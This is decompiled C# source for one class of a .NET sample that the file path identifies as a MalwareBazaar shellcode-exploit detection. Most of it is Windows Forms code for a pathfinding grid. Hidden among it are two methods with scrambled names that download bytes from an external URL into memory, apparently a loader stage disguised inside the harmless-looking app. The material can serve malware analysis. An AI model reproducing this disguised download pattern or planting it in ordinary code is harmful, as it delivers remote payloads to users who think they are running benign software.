// Decompiled with JetBrains decompiler
// Type: PATH_F.Map
// Assembly: PATH_F, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 83C76E89-0EC0-4556-AC03-47BAF793022C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Exploit.MSIL.Shellcode.gen-3e61ff7da9c135135af8936d7fb362a285b02c6431c8614eda55d2cce3bf3ff7.exe

using System;
using System.Collections.Generic;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Windows.Forms;

namespace PATH_F
{
  internal class Map
  {
    public static WebResponse KWJAOFIWAFJW()
    {
      ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      return WebRequest.Create("https://www.aot.org.lb/Classes/mph/754").GetResponse();
    }

    public static byte[] KJAFHAFI()
    {
      using (MemoryStream destination = new MemoryStream())
      {
        Map.KWJAOFIWAFJW().GetResponseStream().CopyTo((Stream) destination);
        return destination.ToArray();
      }
    }

    public static void SetParametsForLoadedList(
      List<Cell> lista_cell,
      int start,
      int end,
      string[] obstaclesNew,
      Form1 form)
    {
      lista_cell[start].start = true;
      lista_cell[start].klikniety = true;
      lista_cell[end].end = true;
      lista_cell[end].klikniety = true;
      lista_cell[0].isStart = start;
      lista_cell[0].isEnd = end;
      foreach (string s in obstaclesNew)
      {
        if (s != "")
        {
          int index = int.Parse(s);
          lista_cell[index].przeszkoda = true;
          lista_cell[index].klikniety = true;
        }
      }
    }

    public static void DisplayLoadedMap(List<string> maps, Form1 form)
    {
      if (maps == null)
        return;
      foreach (string map in maps)
      {
        char[] chArray = new char[1]{ ';' };
        string[] strArray = map.Split(chArray);
        form.comboBox1.Items.Add((object) strArray[0]);
      }
    }

    public static void PaintMap(Form1 form, int number)
    {
      int num1 = number;
      Random random = new Random();
      int height = form.mainPanel.Height;
      int width = form.mainPanel.Width;
      int num2 = height / num1;
      for (int index1 = 0; index1 < num1; ++index1)
      {
        for (int index2 = 0; index2 < num1; ++index2)
        {
          Panel panel = new Panel();
          Point point = new Point(index2 * num2, index1 * num2);
          panel.Location = point;
          panel.TabIndex = index2 + num1 * index1;
          panel.BackColor = Color.Honeydew;
          panel.Name = "panel" + panel.TabIndex.ToString();
          panel.Size = new Size(num2, num2);
          form.mainPanel.Controls.Add((Control) panel);
          panel.Click += new EventHandler(form.panelAdd);
        }
      }
    }

    public static List<Cell> lista(int rozmiar)
    {
      List<Cell> cellList = new List<Cell>();
      int index1 = 0;
      for (int index2 = 0; index2 < rozmiar; ++index2)
      {
        for (int index3 = 0; index3 < rozmiar; ++index3)
        {
          cellList.Add(new Cell());
          cellList[index1].index = index1;
          cellList[index1].x = index3;
          cellList[index1].y = index2;
          cellList[index1].start = false;
          cellList[index1].end = false;
          cellList[index1].przeszkoda = false;
          cellList[index1].klikniety = false;
          cellList[index1].main = false;
          ++index1;
        }
      }
      cellList[0].isStart = -1;
      cellList[0].isEnd = -1;
      return cellList;
    }

    public static void Paint(Form1 Form1, Panel clickedPanel, List<Cell> lista_cell)
    {
      int indexPanel = clickedPanel.TabIndex;
      if (lista_cell[indexPanel].klikniety)
        klikniety();
      else
        nieklikniety();

      void klikniety()
      {
        if (clickedPanel.BackColor == Color.Green)
        {
          Form1.label1.Text = "-";
          Form1.label2.Text = "-";
          clickedPanel.BackColor = Color.Honeydew;
          lista_cell[indexPanel].start = false;
          lista_cell[0].isStart = -1;
          lista_cell[indexPanel].klikniety = false;
        }
        if (clickedPanel.BackColor == Color.Red)
        {
          Form1.label4.Text = "-";
          Form1.label5.Text = "-";
          lista_cell[0].isEnd = -1;
          clickedPanel.BackColor = Color.Honeydew;
          lista_cell[indexPanel].end = false;
          lista_cell[indexPanel].klikniety = false;
        }
        if (!(clickedPanel.BackColor == Color.Black))
          return;
        lista_cell[indexPanel].przeszkoda = false;
        clickedPanel.BackColor = Color.Honeydew;
        lista_cell[indexPanel].klikniety = false;
      }

      void nieklikniety()
      {
        if (!(clickedPanel.BackColor == Color.Honeydew))
          return;
        if (lista_cell[0].isEnd != -1 && lista_cell[0].isStart != -1)
        {
          lista_cell[indexPanel].przeszkoda = true;
          clickedPanel.BackColor = Color.Black;
          lista_cell[indexPanel].klikniety = true;
        }
        int num;
        if (lista_cell[0].isEnd == -1 && lista_cell[0].isStart != -1)
        {
          Form1.label4.Text = lista_cell[indexPanel].x.ToString();
          Label label5 = Form1.label5;
          num = lista_cell[indexPanel].y;
          string str = num.ToString();
          label5.Text = str;
          lista_cell[0].isEnd = indexPanel;
          clickedPanel.BackColor = Color.Red;
          lista_cell[indexPanel].end = true;
          lista_cell[indexPanel].klikniety = true;
        }
        if (lista_cell[0].isStart == -1)
        {
          Label label1 = Form1.label1;
          num = lista_cell[indexPanel].x;
          string str1 = num.ToString();
          label1.Text = str1;
          Label label2 = Form1.label2;
          num = lista_cell[indexPanel].y;
          string str2 = num.ToString();
          label2.Text = str2;
          lista_cell[0].isStart = indexPanel;
          clickedPanel.BackColor = Color.Green;
          lista_cell[indexPanel].start = true;
          lista_cell[indexPanel].klikniety = true;
        }
      }
    }

    public static void Repaint(List<Cell> lista, Form1 form)
    {
      form.label9.Text = "-";
      foreach (Cell cell in lista)
      {
        cell.main = false;
        int index;
        if (cell.przeszkoda)
        {
          index = cell.index;
          string key = "panel" + index.ToString();
          (((IEnumerable<Control>) form.Controls.Find(key, true)).First<Control>() as Panel).BackColor = Color.Black;
        }
        if (cell.start)
        {
          index = cell.index;
          string key = "panel" + index.ToString();
          (((IEnumerable<Control>) form.Controls.Find(key, true)).First<Control>() as Panel).BackColor = Color.Green;
        }
        if (cell.end)
        {
          index = cell.index;
          string key = "panel" + index.ToString();
          (((IEnumerable<Control>) form.Controls.Find(key, true)).First<Control>() as Panel).BackColor = Color.Red;
        }
        if (!cell.przeszkoda && !cell.start && !cell.end)
        {
          index = cell.index;
          string key = "panel" + index.ToString();
          (((IEnumerable<Control>) form.Controls.Find(key, true)).First<Control>() as Panel).BackColor = Color.Honeydew;
        }
      }
    }
  }
}
